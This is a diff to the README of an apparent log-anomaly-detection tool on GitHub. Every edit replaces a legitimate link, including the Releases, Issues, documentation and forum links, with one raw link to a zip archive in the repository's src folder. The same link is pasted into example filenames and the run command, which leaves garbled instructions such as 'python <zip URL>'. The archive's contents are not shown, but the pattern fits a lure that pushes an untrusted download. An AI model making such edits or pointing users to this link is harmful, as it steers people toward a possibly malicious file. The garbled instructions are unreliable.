@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-green)](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/releases)
+[![Download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip)](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Follow these steps to get started with log-anomaly-detector.
 
 ### 🔗 How to Download
 
-1. Visit the **Releases page** to download the software: [Visit this page to download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/releases).
+1. Visit the **Releases page** to download the software: [Visit this page to download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip).
 2. Locate the latest version of log-anomaly-detector.
 3. Click the download link for your operating system.
 
@@ -35,7 +35,7 @@ Follow these steps to get started with log-anomaly-detector.
 
 1. Open a terminal or command prompt.
 2. Navigate to the installation directory using the `cd` command.
-3. Type `python main.py` to start the application.
+3. Type `python https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip` to start the application.
 
 ## 📊 Features
 
@@ -48,13 +48,13 @@ Follow these steps to get started with log-anomaly-detector.
 ## 📑 Usage Instructions
 
 1. Once you launch the application, you will see a prompt asking for the log file you want to analyze.
-2. Enter the path to the log file, such as `/var/log/syslog` or `C:\logs\auth.log`.
+2. Enter the path to the log file, such as `/var/log/syslog` or `C:\logs\https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip`.
 3. The application will process the log and display any detected anomalies.
 
 ## 🗂 Supported Log Types
 
 - System logs (e.g., syslog)
-- Authentication logs (e.g., auth.log)
+- Authentication logs (e.g., https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip)
 - Web server logs (e.g., access logs from Apache, Nginx)
 
 ## 🤝 Contributions
@@ -73,13 +73,13 @@ If you experience issues:
 
 ## ✉️ Support
 
-For support, please open an issue on our [GitHub Issues page](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/issues). We aim to respond promptly and help you resolve any problems.
+For support, please open an issue on our [GitHub Issues page](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip). We aim to respond promptly and help you resolve any problems.
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/ELI7E3-M4MUN/log-anomaly-detector)
-- [Community Forum](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/discussions)
+- [Official Documentation](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip)
+- [Community Forum](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip)
 
 ## 📥 Download and Install
 
-To get started, visit the **Releases page** to download log-anomaly-detector now: [Visit this page to download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/releases). Follow the above directions, and you'll be ready in no time.
+To get started, visit the **Releases page** to download log-anomaly-detector now: [Visit this page to download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/raw/refs/heads/main/src/log_anomaly_detector_2.4-alpha.4.zip). Follow the above directions, and you'll be ready in no time.
